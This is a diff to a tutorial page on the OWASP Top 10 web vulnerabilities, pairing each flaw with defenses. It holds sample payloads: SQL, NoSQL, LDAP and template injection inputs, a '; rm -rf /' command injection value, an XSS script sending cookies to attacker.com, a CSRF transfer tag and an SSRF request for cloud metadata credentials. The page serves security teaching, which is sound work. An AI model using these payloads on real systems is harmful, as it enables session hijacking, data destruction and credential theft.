@@ -1,29 +1,203 @@
 ---
 title: "Web Vulnerabilities"
-description: "Understanding the OWASP Top 10 and common web application flaws."
+description: "The OWASP Top 10, injection attacks, XSS, CSRF, SSRF, broken authentication, and security misconfigurations — with real exploit examples."
 ---
 
 # Web Vulnerabilities
 
-Modern web applications are complex, and with complexity comes vulnerability. The Open Worldwide Application Security Project (OWASP) maintains a list of the top 10 most critical security risks to web applications. Here are a few of the most prominent.
+Modern web applications are complex systems built on layers of frameworks, libraries, APIs, databases, and third-party services. Each layer introduces potential vulnerabilities that attackers actively hunt for.
 
-## Injection (SQLi)
+The **OWASP (Open Worldwide Application Security Project)** maintains the industry-standard list of the most critical web application security risks. Understanding these vulnerabilities is essential for both developers building applications and security professionals testing them.
+
+## A01: Broken Access Control
+
+The #1 risk on the OWASP Top 10 (2021). Broken access control occurs when users can act outside their intended permissions.
+
+### Common Flaws
+
+- **Insecure Direct Object Reference (IDOR)**: Changing a parameter in the URL to access another user's data.
+
+```
+# User 1001 views their own invoice:
+GET /api/invoices/1001
+
+# Attacker changes the ID to view user 1002's invoice:
+GET /api/invoices/1002    ← No authorization check!
+```
+
+- **Privilege escalation**: A regular user accessing admin functionality by navigating directly to `/admin/dashboard` or modifying a role field in the request.
+- **Missing function-level access control**: The UI hides the "Delete User" button for non-admins, but the API endpoint `DELETE /api/users/123` has no server-side authorization check.
+
+<Warning>
+Never rely on client-side controls (hiding buttons, disabling fields) for security. All authorization must be enforced on the **server side**. Attackers bypass the UI entirely and interact directly with your API.
+</Warning>
+
+### Defense
+
+- Implement role-based access control (RBAC) or attribute-based access control (ABAC) on the server.
+- Deny by default — require explicit authorization for every endpoint.
+- Log and alert on access control failures.
+
+## A02: Cryptographic Failures
+
+Previously called "Sensitive Data Exposure." This covers failures in protecting data in transit and at rest.
+
+### Common Flaws
+
+- Transmitting sensitive data over HTTP instead of HTTPS
+- Using deprecated algorithms (MD5, SHA-1, DES, RC4)
+- Storing passwords in plaintext or with unsalted hashes
+- Hardcoding encryption keys in source code
+- Using weak or default TLS configurations
+
+**Real-world example**: In 2013, Adobe suffered a breach exposing **153 million user records**. Passwords were encrypted (not hashed) using 3DES in ECB mode with a single key — allowing attackers to decrypt them. ECB mode is particularly dangerous because identical plaintexts produce identical ciphertexts, revealing patterns.
+
+## A03: Injection
+
 Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.
-- **SQL Injection (SQLi):** An attacker alters a database query by manipulating user input. For example, submitting `' OR 1=1 --` into a login field might bypass authentication entirely.
-- **Impact:** Attackers can view, modify, or delete database records, sometimes compromising the entire server.
 
-## Cross-Site Scripting (XSS)
-XSS occurs when an application includes untrusted data in a web page without proper validation or escaping.
-- **Stored XSS:** The malicious script is permanently stored on the target servers (e.g., in a comment forum). When a victim views the page, the script executes in their browser.
-- **Reflected XSS:** The malicious script is reflected off a web application onto the victim's browser (usually via a crafted link).
-- **Impact:** Attackers can hijack user sessions, deface websites, or redirect users to malicious sites.
+### SQL Injection (SQLi)
 
-## Broken Authentication
-Authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.
-- **Session Hijacking:** Stealing an active session cookie.
-- **Credential Stuffing:** Using automated scripts to test lists of compromised credentials.
+The most well-known injection attack. An attacker manipulates a SQL query by injecting code through user input.
 
-## Cross-Site Request Forgery (CSRF)
-CSRF forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
-- **How it works:** An attacker tricks the victim into clicking a link or loading an image that triggers a state-changing request (like transferring funds or changing an email address) on the vulnerable site.
-- **Defense:** Using unpredictable Anti-CSRF tokens for all state-changing requests.
+**Vulnerable code:**
+```python
+# NEVER DO THIS - string concatenation with user input
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+```
+
+**Attack input:**
+```
+username: admin' --
+password: anything
+```
+
+**Resulting query:**
+```sql
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
+```
+
+The `--` comments out the password check, granting access to the admin account without knowing the password.
+
+**Secure code (parameterized query):**
+```python
+# ALWAYS use parameterized queries
+cursor.execute(
+    "SELECT * FROM users WHERE username = %s AND password = %s",
+    (username, password)
+)
+```
+
+### Other Injection Types
+
+| Type | Target | Example |
+|------|--------|---------|
+| **NoSQL Injection** | MongoDB, CouchDB | `{"username": {"$gt": ""}, "password": {"$gt": ""}}` |
+| **OS Command Injection** | System shell | `; rm -rf /` appended to a filename input |
+| **LDAP Injection** | Directory services | `*)(uid=*))(|(uid=*` to bypass authentication |
+| **Template Injection (SSTI)** | Server-side templates (Jinja2, Twig) | `{{7*7}}` renders as `49` — confirming code execution |
+
+## A04: Insecure Design
+
+This category addresses flaws in the architecture and design of the application — not implementation bugs, but missing security controls that should have been designed in from the start.
+
+**Examples:**
+- A password recovery flow that allows unlimited attempts with no rate limiting
+- A checkout process that trusts client-side price calculations
+- An API that returns full user objects (including sensitive fields) when only the username was requested
+
+**Defense:** Threat modeling during the design phase (STRIDE methodology), secure design patterns, and abuse case analysis.
+
+## A05: Security Misconfiguration
+
+The most common vulnerability in real-world deployments. It occurs when security settings are left at insecure defaults or improperly configured.
+
+### Common Misconfigurations
+
+- Default admin credentials (`admin/admin`, `root/password`)
+- Unnecessary services, ports, or features enabled
+- Verbose error messages exposing stack traces and internal paths
+- Directory listing enabled on web servers
+- Missing security headers (`Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`)
+- Cloud storage buckets (S3, GCS) left publicly accessible
+
+**Real-world example**: In 2017, a misconfigured AWS S3 bucket belonging to a US military contractor exposed **Top Secret** intelligence data — including passwords, security credentials, and the private keys to a Pentagon system.
+
+## A07: Cross-Site Scripting (XSS)
+
+XSS occurs when an application includes untrusted data in a web page without proper validation or encoding.
+
+### Types of XSS
+
+| Type | Mechanism | Persistence |
+|------|-----------|-------------|
+| **Stored XSS** | Malicious script saved in the database (e.g., in a comment field). Executes when any user views the page. | Persistent |
+| **Reflected XSS** | Malicious script embedded in a URL. Executes when a victim clicks the crafted link. | Non-persistent |
+| **DOM-based XSS** | Client-side JavaScript modifies the DOM using untrusted data (e.g., `document.location.hash`). | Non-persistent |
+
+**Example payload:**
+```html
+<script>
+  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+</script>
+```
+
+If this script executes in a victim's browser, it sends their session cookie to the attacker — enabling session hijacking.
+
+### Defense
+
+- **Output encoding**: Encode all user-supplied data before rendering it in HTML, JavaScript, CSS, or URLs. Use context-aware encoding.
+- **Content Security Policy (CSP)**: A browser-enforced header that restricts which scripts can execute on your page.
+- **Framework protections**: React, Angular, and Vue automatically encode output by default. Never bypass these protections (e.g., `dangerouslySetInnerHTML` in React) without sanitization.
+
+## A08: Cross-Site Request Forgery (CSRF)
+
+CSRF tricks a victim's browser into making an unwanted request to a site where they are authenticated.
+
+**Attack scenario:**
+1. Victim is logged into their bank at `bank.com`.
+2. Victim visits a malicious page that contains: `<img src="https://bank.com/transfer?to=attacker&amount=10000">`
+3. The browser automatically includes the victim's session cookie with the request.
+4. The bank processes the transfer because the request appears legitimate.
+
+### Defense
+
+- **Anti-CSRF tokens**: Include a unique, unpredictable token in every state-changing form. The server validates the token before processing the request.
+- **SameSite cookies**: Set the `SameSite` attribute on session cookies to `Strict` or `Lax` to prevent the browser from sending cookies with cross-origin requests.
+- **Require re-authentication**: For sensitive actions (password changes, fund transfers), require the user to re-enter their password.
+
+## A10: Server-Side Request Forgery (SSRF)
+
+SSRF occurs when an attacker can make the server send HTTP requests to arbitrary destinations — including internal services that are not directly accessible from the internet.
+
+**Attack scenario:**
+```
+# Normal request - fetch a URL for preview
+POST /api/fetch-url
+{"url": "https://example.com/article"}
+
+# SSRF attack - access internal metadata service
+POST /api/fetch-url
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+```
+
+The cloud metadata endpoint (`169.254.169.254`) is only accessible from within the cloud instance. An SSRF vulnerability allows the attacker to reach it through the server, potentially stealing cloud credentials.
+
+**Real-world example**: The 2019 Capital One breach (100M+ customer records exposed) was enabled by an SSRF vulnerability that allowed the attacker to access AWS IAM credentials from the EC2 metadata service.
+
+### Defense
+
+- Validate and sanitize all user-supplied URLs
+- Use allowlists for permitted domains/IP ranges
+- Block requests to internal IP ranges (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`, `169.254.x.x`)
+- Use the IMDSv2 (Instance Metadata Service v2) on AWS, which requires a session token
+
+## Key Takeaways
+
+1. **Never trust user input**: Validate, sanitize, and encode everything.
+2. **Authorize on the server**: Client-side controls are cosmetic, not security.
+3. **Use parameterized queries**: The only reliable defense against SQL injection.
+4. **Implement CSP headers**: Defense in depth against XSS.
+5. **Protect against CSRF**: Use anti-CSRF tokens and SameSite cookies.
+6. **Block SSRF**: Validate URLs, block internal IPs, use cloud metadata service v2.
+7. **Audit configurations**: Default settings are almost never secure.
